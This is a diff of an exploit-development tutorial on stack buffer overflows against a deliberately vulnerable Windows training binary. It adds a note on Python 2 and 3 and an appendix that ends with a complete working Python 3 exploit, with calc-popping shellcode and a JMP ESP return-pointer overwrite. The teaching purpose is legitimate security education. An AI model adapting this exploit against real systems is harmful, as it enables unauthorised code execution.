@@ -1,5 +1,5 @@
 ---
-title: "The Tutorial for Cross-Site Scripters Who Can't Stack Buffer Overflow Good and Want to Do Other Stuff Good Too"
+title: "Do Stack Buffer Overflow Good"
 author: "@justinsteven"
 papersize: a4
 abstract: pop calc, not alert(1)
@@ -8,7 +8,7 @@ toc: true
 ---
 
 \begin{center}
-  Last updated 2019-01-21
+  Last updated 2020-01-06
 
   \url{https://github.com/justinsteven/dostackbufferoverflowgood}
 \end{center}
@@ -17,12 +17,11 @@ toc: true
 # Intro
 
 This is a tutorial for `dostackbufferoverflowgood.exe`, a vulnerable Windows
-binary produced for The Presentation for Cross-Site Scripters Who Can't Stack
-Buffer Overflow Good and Want to Do Other Stuff Good Too.
+binary.
 
-By the end the tutorial, you should be on your way to feeling comfortable with
-the concepts of stack buffer overflows and using them for Saved Return Pointer
-overwrite exploitation.
+By the end of the tutorial, you should be on your way to feeling comfortable
+with the concept of stack buffer overflows and using them for Saved Return
+Pointer overwrite exploitation.
 
 Exploit development is a journey, and it takes some time to get used to the
 concepts. Don't beat yourself up if anything is unclear, I probably sucked at
@@ -49,24 +48,68 @@ might be useful, please reach out to me. Pull requests gratefully accepted.
 
 Thanks to the following champions:
 
-* OJ (<https://twitter.com/TheColonial>) for pointing out the dumb stuff
-* pipes for some totally bad-ass QA
+* OJ, Pipes and Menztrual for QA
+* timkent, jburger, xens, lesydimitri and KrE80r for various fixes
+* Mitchell Moser (<https://github.com/mitchmoser>) for support with the move to Python 3
 
-This is likely to end up being a living document. Keep an eye on the GitHub
-repo for updates.
+This a living document. Keep an eye on the GitHub repo for updates.
 
 ![This work is licensed under a Creative Commons Attribution 4.0 International
 License
 <https://creativecommons.org/licenses/by/4.0/>](dostackbufferoverflowgood_images/cc4-by.png)
 
 Please feel free to use this material however you wish, all I ask is that you
-attribute me as the author. If you improve the material, I would love you to
-send me your changes to be included in the document, but I don't require you to
-do so.
+attribute me as the author. If you improve the material, I would love for you
+to send me your changes to be included in the document.
 
 Happy hacking!
 
 Justin
+
+\newpage
+# A quick note on Python 2 vs. Python 3
+
+This guide was written in 2016 and the code it teaches you to write is for
+Python 2. In 2018, the Python developers announced that development and
+support of Python 2 would be finished, no foolin' this time, on January 1st
+2020.
+
+This means that as of 2020, the core Python 2 interpreter will be EOL (End of
+Life) and will receive no functional or security updates. We should expect
+that Linux distributions will eventually remove Python 2 from their software
+repositories.
+
+This has an interesting effect on exploit development using Python.
+
+* Python 2 (Released in 2000) uses plain ASCII strings everywhere by default
+* Python 3 (Released in 2008) uses either Unicode strings or "bytes" by default
+
+This makes it easier and more natural for Python 3 developers to handle
+non-English characters. On the other hand, if all you want to do is write an
+exploit that throws plain old 8-bit bytes and ASCII characters around, it can
+feel like Python 3 gets in your way a little bit. In the best case scenario,
+Python 3 will raise errors and force you to be more specific about how you
+want it to handle your strings. In the worst case, Python 3 could assume what
+you meant, encode things in a way you didn't intend, and could cause your
+exploit to behave incorrectly.
+
+There *should not* be an issue with using Python 2 for simple exploits such
+as the one in this tutorial. We're not using any third-party libraries, and
+what we're doing with core Python 2 functionality *shouldn't* bump up against
+any functional bugs or security vulnerabilities.
+
+This guide was written to help you exploit your first stack buffer overflow
+exploit. You'll have enough new concepts on your mind without needing to
+worry about Python 3's preference for bytes. And so, this guide **is
+intentionally written for Python 2**.
+
+Some general suggestions:
+
+* When following this guide, I encourage you to use **Python 2**, especially if this is your first rodeo
+* When writing simple exploits in the future, it's up to you to decide whether you use the simpler, out-of-support, Python 2 - or if you use the more modern Python 3
+* When writing more complicated or general-purpose code, I encourage you to use **Python 3**
+* If, in the future, Python 2 becomes a hassle to run (I expect Linux distributions will eventually remove it from software repositories), it's up to you to decide whether you struggle with getting a copy of Python 2, or whether you make the leap to Python 3
+* If you decide to use Python 3, then Appendix A of this document may help you to make the needed adjustments
 
 \newpage
 # Get set up
@@ -79,9 +122,13 @@ Go and grab yourself the target and some tools.
 
 You'll want to either allow `dostackbufferoverflowgood.exe` (TCP 31337) to be
 accessed through the Windows Firewall, or turn the Windows Firewall off
-completely. You might also need the Visual C Runtime installed to run
-`dostackbufferoverflowgood.exe` - see
+completely.
+
+You might also need the Visual C Runtime installed. See
 <https://www.microsoft.com/en-au/download/details.aspx?id=48145> for details.
+Be sure to install the x86 version of the runtime, even if you have an x64
+installation of Windows. The runtime architecture must match that of
+`dostackbufferoverflowgood.exe` itself.
 
 **The tools:**
 
@@ -118,10 +165,10 @@ You'll probably want a remote "attacker" box running some flavour of GNU/Linux
 that can see the Windows box. You could launch your attack from the Windows box
 itself, but it's much more exciting to do so remotely. Your attacker box will
 need to have Metasploit and Python installed. Kali will work just fine. You
-could probably make do with Metasploit on OS X if you are so inclined.
+could probably make do with Metasploit on macOS if you are so inclined.
 
-For help with installing Metasploit on Windows or OS X, see
-<https://www.rapid7.com/products/metasploit/download.jsp#msf>
+For help with installing Metasploit on Windows or macOS, see
+<https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers>
 
 \newpage
 # Review the source code
@@ -231,7 +278,7 @@ button](dostackbufferoverflowgood_images/immdbg_startprocess.png)
 
 Use Netcat (`nc`) on a remote GNU/Linux machine to take the service, which
 listens on TCP port 31337, for a quick spin. The IP address of my lab machine
-running the service is `172.17.24.132` but yours will probably differ.
+running the service is `172.17.24.132` but yours will probably be different.
 
 ```
 % nc 172.17.24.132 31337
@@ -244,12 +291,13 @@ Hello hjkl;!!!
 ^C
 ```
 
-We're going to need something a bit more powerful than typing human-readable
-characters at the service over `nc` as our exploit is going to involve sending
-some, uh, "creative" characters.
+`nc` is great for doing basic interaction with a service over the network,
+but it's too limited for us. For example, we're going to need to send
+characters that don't appear on a standard keyboard.
 
 Let's put together a small Python script to connect to the service, send some
-text, print the response and disconnect.
+text, print the response and disconnect. We can then upgrade our Python
+script as we go.
 
 ```{.python .numberLines}
 #!/usr/bin/env python2
@@ -388,8 +436,7 @@ writing):
 
 The paid version of IDA is quite expensive, but well worth the money if you
 have the need for a disassembler. The free version will work just fine for our
-needs against `dostackbufferoverflowgood.exe` even if it is a little old and
-clunky.
+needs against `dostackbufferoverflowgood.exe` even if it is limited.
 
 Alternatives to IDA include:
 
@@ -397,6 +444,7 @@ Alternatives to IDA include:
 * Binary Ninja <https://binary.ninja/> - commercial
 * radare2 <http://radare.org> - free software
 * The Online Disassembler <https://www.onlinedisassembler.com/static/home/>
+* Ghidra <https://github.com/NationalSecurityAgency/ghidra>
 
 Install IDA Free from
 <https://www.hex-rays.com/products/ida/support/download_freeware.shtml> (unless
@@ -603,7 +651,7 @@ breakpoint](dostackbufferoverflowgood_images/immdbg_breakpoint_call.png)
 
 **Function `CALL` mechanics**
 
-Now, we know that when a `CALL` is executed, it does two things:
+When a `CALL` is executed, it does two things:
 
 * It `PUSH`es the address of the next instruction to the stack (so it can later be `RET`urned to by the `CALL`ed function)
 * It modifies `EIP` so that execution jumps to the function being `CALL`ed
@@ -859,7 +907,7 @@ EIP -> 08041796  |. 5D             POP EBP
 ....
 ```
 
-This instruction will will restore the Saved `EBP` value (at which `ESP` is now
+This instruction will restore the Saved `EBP` value (at which `ESP` is now
 pointing) in to the `EBP` register.
 
 Stepping into this instruction (`F7`) will have `ESP` now point at
@@ -1504,8 +1552,8 @@ Pointer.
 -------------------------------------------------------------------
                    overwritten saved RET ptr
           padding    (pointer to JMP ESP)       bytecode
-             |                 |                   |
-/----------------------------\/--\/-------------------------------\
+             |                |                    |
+/------------v----------------v--------------------v--------------\
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPPPPBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
                                   ^
                                   |
@@ -1517,8 +1565,9 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPPPPBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 
 Before we give one of our gadgets a go, we need to know to take in to account
 what is called "Endianness". x86 is what's known as a little-endian
-architecture. On a little-endian architecture, values are stored in memory as
-back-to-front bytes, with the Least Significant Byte (LSB) appearing first.
+architecture. On a little-endian architecture, values such as numbers or
+memory addresses are stored in memory as back-to-front bytes, with the Least
+Significant Byte (LSB) appearing first.
 
 For example:
 
@@ -2107,3 +2156,453 @@ Justin
 ![This work is licensed under a Creative Commons Attribution 4.0 International
 License
 <https://creativecommons.org/licenses/by/4.0/>](dostackbufferoverflowgood_images/cc4-by.png)
+
+\newpage
+# Appendix A - Python 3 Support
+
+As mentioned at the beginning of this document, Python 2 is officialy End of
+Life as of 1 January 2020. The code examples in this document were
+intentionally written for Python 2. If this was your first time writing a
+stack buffer overflow exploit, I recommend that you use Python 2.
+
+However, you may wish to use Python 3 for the following reasons:
+
+* We're in a magical future world where it's too hard for you to install and run Python 2
+* Python 2 is so old that it's misbehaving on your Operating System
+* You want to learn to use Python 3 so you're ready to write more complicated, future-proof software or exploits using a supported version of Python
+* You just want to challenge yourself
+
+If so, this section describes some of the differences between Python 2 and Python 3 that you'll need to be mindful of.
+
+**The shebang**
+
+You may have noticed that all of the code examples in this document started with the following line:
+
+```{.python .numberLines}
+#!/usr/bin/env python2
+```
+
+This is known as a "shebang". On a Unix-based system (Such as Linux or
+macOS), when you execute a script file that starts with a shebang, the
+Operating System will use the contents of the line to determine which
+interpreter to run the script with. In this case, the OS will execute
+`/usr/bin/env` with an argument of `python2`. `/usr/bin/env` will consult
+your `$PATH` environment variable, and will look through all of your `$PATH`
+directories for a `python2` executable file. If it finds one (Which it
+should, if you have Python 2 installed to a directory in your `$PATH`) then
+your script will be executed using that copy of Python 2.
+
+If you want to use Python 3, you should change this line as follows:
+
+```{.python .numberLines}
+#!/usr/bin/env python3
+```
+
+Note that you can always override the shebang by directly executing the
+Python you wish to use, and passing to it the path to the script you wish to
+execute. For example, the following command-line command would execute the
+"script.py" file using the version of Python specified by its shebang:
+
+```
+% ./script.py
+```
+
+While the following would specifically execute "script.py" using Python 3:
+
+```
+% python3 script.py
+```
+
+\newpage
+**print() is now a function in Python 3**
+
+In Python 2, `print` was a statement and you were able to do this:
+
+```{.python .numberLines}
+#!/usr/bin/env python2
+print "Hello, world!"
+```
+
+Running this using Python 2, we get:
+
+```
+% ./hello_world.py
+Hello, world!
+```
+
+If you try to run this file using Python 3, you'll get an error:
+
+```
+% python3 ./hello_world.py
+  File "./hello_world.py", line 2
+    print "Hello, world!"
+                        ^
+SyntaxError: Missing parentheses in call to 'print'
+```
+
+This is because `print()` is a function in Python 3. You need to surround the
+value being printed using parenthesis as follows:
+
+```{.python .numberLines}
+#!/usr/bin/env python3
+print("Hello, world!")
+```
+
+Running this using Python 3, we get:
+
+```
+% ./hello_world_python3.py
+Hello, world!
+```
+
+\newpage
+**`socket.socket` sends and receives bytes in Python 3**
+
+In Python 2, `socket.socket` worked with "strings"
+
+* When you `send()` data, you must provide a string argument
+* When you `recv()` data, you will get a string response
+
+In Python 3, due to its preference for Unicode by default, `socket.socket`
+(along with many other functions) works with **bytes** instead of strings.
+
+Take, for example, the simple "Connect, send and receive" example from the
+"Remotely interact with the running process" chapter:
+
+```{.python .numberLines}
+#!/usr/bin/env python2
+import socket
+
+RHOST = "172.17.24.132"
+RPORT = 31337
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+buf = ""
+buf += "Python Script"
+buf += "\n"
+
+s.send(buf)
+
+print "Sent: {0}".format(buf)
+
+data = s.recv(1024)
+
+print "Received: {0}".format(data)
+```
+
+Running this using Python 2, we get:
+
+```
+% ./connect_and_send.py
+Sent: Python Script
+
+Received: Hello Python Script!!!
+```
+
+If we run this script using Python 3, the first error we get is due to the
+lack of parenthesis for the `print` (As discussed above):
+
+```
+% cp connect_and_send.py connect_and_send_python3.py
+
+% python3 connect_and_send_pythn3.py
+  File "connect_and_send_python3.py", line 16
+    print "Sent: {0}".format(buf)
+                    ^
+SyntaxError: invalid syntax
+```
+
+\newpage
+If we fix this, we get a new error:
+
+```
+% python3 connect_and_send_python3.py
+Traceback (most recent call last):
+  File "connect_and_send_python3.py", line 14, in <module>
+    s.send(buf)
+TypeError: a bytes-like object is required, not 'str'
+```
+
+We can try to fix this in one of a few ways:
+
+* Instead of progressively building `buf` as a "string", build it as a "bytes" object using the `b` prefix
+* Instead of doing `s.send(buf)`. do:
+  * `s.send(buf.encode("ascii"))` or
+  * `s.send(buf.encode("utf-8"))` or
+  * `s.send(buf.encode())`
+
+While it may be trickier and more repetitive, the first approach is
+preferable to the latter ones.
+
+By building `buf` as a "bytes" object, we retain byte-by-byte control of the
+payload (As we did in the Python 2 approach)
+
+If we did `s.send(buf.encode("ascii"))` it would encode `buf` using ASCII
+encoding. While this might sound similar to the Python 2 behaviour, it
+actually prevents us from using any byte value outside of the ASCII range,
+which is from 0 to 127 (0x00 to 0x7f):
+
+```
+% python3
+Python 3.5.3 (default, Sep 27 2018, 17:25:39)
+[GCC 6.3.0 20170516] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> "\xde\xad\xbe\xef".encode("ascii")
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-3:
+    ordinal not in range(128)
+```
+
+If we did `s.send(buf.encode("utf-8"))`, it would encode `buf` using UTF-8
+encoding. For characters outside of the ASCII range, this will give
+interesting results:
+
+```
+% python3
+Python 3.5.3 (default, Sep 27 2018, 17:25:39)
+[GCC 6.3.0 20170516] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> "\xde\xad\xbe\xef".encode("utf-8")
+b'\xc3\x9e\xc2\xad\xc2\xbe\xc3\xaf'
+```
+
+(This isn't `\xde\xad\xbe\xef` at all)
+
+If we did `s.send(buf.encode())` it would encode `buf` using your Python's
+default encoding (Probably UTF-8) - which, as above, gives interesting behaviour.
+
+It feels inappropriate to smash bytes together into a string, then ask Python
+to encode them to a bytes object for the purpose of passing to
+`socket.send()`. For this reason, we should simply craft a bytes object from
+the beginning.
+
+Instead of doing the following:
+
+```{.python .numberLines}
+buf = ""
+buf += "Python Script"
+buf += "\n"
+```
+
+Do this:
+
+```{.python .numberLines}
+buf = b""
+buf += b"Python Script"
+buf += b"\n"
+```
+
+This will result in the following:
+
+```
+% ./connect_and_send_python3.py
+Sent: b'Python Script\n'
+Received: b'Hello Python Script!!!\n'
+```
+
+Our final script looks like this:
+
+```{.python .numberLines}
+#!/usr/bin/env python3
+import socket
+
+RHOST = "172.17.24.132"
+RPORT = 31337
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+buf = b""
+buf += b"Python Script"
+buf += b"\n"
+
+s.send(buf)
+
+print("Sent: {0}".format(buf))
+
+data = s.recv(1024)
+
+print("Received: {0}".format(data))
+```
+
+\newpage
+**Building a "bytes" version of `badchar_test`**
+
+Recall that, in the "Determine bad characters" chapter, we built a string
+called `badchar_test` as follows:
+
+```{.python .numberLines}
+badchar_test = ""         # start with an empty string
+badchars = [0x00, 0x0A]   # we've reasoned that these are definitely bad
+
+# generate the string
+for i in range(0x00, 0xFF+1):     # range(0x00, 0xFF) only returns up to 0xFE
+  if i not in badchars:           # skip the badchars
+    badchar_test += chr(i)        # append each non-badchar char to the string
+
+# open a file for writing ("w") the string as binary ("b") data
+with open("badchar_test.bin", "wb") as f:
+  f.write(badchar_test)
+```
+
+This needs some tweaking in Python 3's world of bytes.
+
+`chr(i)` gives us a string-type single character in Python 3:
+
+```
+% python3
+Python 3.5.3 (default, Sep 27 2018, 17:25:39)
+[GCC 6.3.0 20170516] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> chr(0x41)
+'A'
+
+>>> type(chr(0x41))
+<class 'str'>
+```
+
+Alternatively, `bytes([i])` gives us a single bytes-type character:
+
+```
+% python3
+Python 3.5.3 (default, Sep 27 2018, 17:25:39)
+[GCC 6.3.0 20170516] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> bytes([0x41])
+b'A'
+
+>>> type(bytes([0x41]))
+<class 'bytes'>
+```
+
+\newpage
+And so our `badchar_test` generation becomes:
+
+```{.python .numberLines}
+badchar_test = b""        # start with an empty byte string
+badchars = [0x00, 0x0A]   # we've reasoned that these are definitely bad
+
+# generate the string
+for i in range(0x00, 0xFF+1):     # range(0x00, 0xFF) only returns up to 0xFE
+  if i not in badchars:           # skip the badchars
+    badchar_test += bytes([i])    # append each non-badchar char to the byte string
+
+# open a file for writing ("w") the byte string as binary ("b") data
+with open("badchar_test.bin", "wb") as f:
+  f.write(badchar_test)
+```
+
+As an aside, you may have noticed that this code is needlessly complicated.
+This was done to make the logic easier to follow for Python beginners. The
+generation of `badchar_test` can be rewritten using Python generator
+comprehension as follows:
+
+```{.python .numberLines}
+badchar_test = bytes(c for c in range(256) if c not in [0x00, 0x0A])
+```
+
+\newpage
+**`struct.pack()` now returns bytes in Python 3**
+
+`struct.pack()` returned a string in Python 2:
+
+```
+% python2
+Python 2.7.13 (default, Sep 26 2018, 18:42:22)
+[GCC 6.3.0 20170516] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> import struct
+
+>>> struct.pack("<I", 0xdeadbeef)
+'\xef\xbe\xad\xde'
+
+>>> type(struct.pack("<I", 0xdeadbeef))
+<type 'str'>
+```
+
+While in Python 3 it now returns bytes:
+
+```
+% python3
+Python 3.5.3 (default, Sep 27 2018, 17:25:39)
+[GCC 6.3.0 20170516] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> import struct
+
+>>> struct.pack("<I", 0xdeadbeef)
+b'\xef\xbe\xad\xde'
+
+>>> type(struct.pack("<I", 0xdeadbeef))
+<class 'bytes'>
+```
+
+Since we're building a bytes-type string, this is fine for our needs. We
+don't need to do anything differently here.
+
+\newpage
+**The exploit for Python 3**
+
+Putting all of this together, a working exploit for Python 3 might look like
+the following:
+
+```{.python .numberLines}
+#!/usr/bin/env python3
+import socket
+import struct
+
+RHOST = "172.17.24.132"
+RPORT = 31337
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+buf_totlen = 1024
+offset_srp = 146
+
+ptr_jmp_esp = 0x080414C3
+
+sub_esp_10 = b"\x83\xec\x10"
+
+shellcode_calc =  b""
+shellcode_calc += b"\xb8\x3e\x08\xbf\x9c\xdb\xdc\xd9\x74\x24"
+shellcode_calc += b"\xf4\x5f\x29\xc9\xb1\x31\x31\x47\x13\x03"
+shellcode_calc += b"\x47\x13\x83\xc7\x3a\xea\x4a\x60\xaa\x68"
+shellcode_calc += b"\xb4\x99\x2a\x0d\x3c\x7c\x1b\x0d\x5a\xf4"
+shellcode_calc += b"\x0b\xbd\x28\x58\xa7\x36\x7c\x49\x3c\x3a"
+shellcode_calc += b"\xa9\x7e\xf5\xf1\x8f\xb1\x06\xa9\xec\xd0"
+shellcode_calc += b"\x84\xb0\x20\x33\xb5\x7a\x35\x32\xf2\x67"
+shellcode_calc += b"\xb4\x66\xab\xec\x6b\x97\xd8\xb9\xb7\x1c"
+shellcode_calc += b"\x92\x2c\xb0\xc1\x62\x4e\x91\x57\xf9\x09"
+shellcode_calc += b"\x31\x59\x2e\x22\x78\x41\x33\x0f\x32\xfa"
+shellcode_calc += b"\x87\xfb\xc5\x2a\xd6\x04\x69\x13\xd7\xf6"
+shellcode_calc += b"\x73\x53\xdf\xe8\x01\xad\x1c\x94\x11\x6a"
+shellcode_calc += b"\x5f\x42\x97\x69\xc7\x01\x0f\x56\xf6\xc6"
+shellcode_calc += b"\xd6\x1d\xf4\xa3\x9d\x7a\x18\x35\x71\xf1"
+shellcode_calc += b"\x24\xbe\x74\xd6\xad\x84\x52\xf2\xf6\x5f"
+shellcode_calc += b"\xfa\xa3\x52\x31\x03\xb3\x3d\xee\xa1\xbf"
+shellcode_calc += b"\xd3\xfb\xdb\x9d\xb9\xfa\x6e\x98\x8f\xfd"
+shellcode_calc += b"\x70\xa3\xbf\x95\x41\x28\x50\xe1\x5d\xfb"
+shellcode_calc += b"\x15\x0d\xbc\x2e\x63\xa6\x19\xbb\xce\xab"
+shellcode_calc += b"\x99\x11\x0c\xd2\x19\x90\xec\x21\x01\xd1"
+shellcode_calc += b"\xe9\x6e\x85\x09\x83\xff\x60\x2e\x30\xff"
+shellcode_calc += b"\xa0\x4d\xd7\x93\x29\xbc\x72\x14\xcb\xc0"
+
+buf = b""
+buf += b"A"*(offset_srp - len(buf))     # padding
+buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite
+buf += sub_esp_10                       # ESP points here
+buf += shellcode_calc
+buf += b"D"*(buf_totlen - len(buf))     # trailing padding
+buf += b"\n"
+
+s.send(buf)
+```
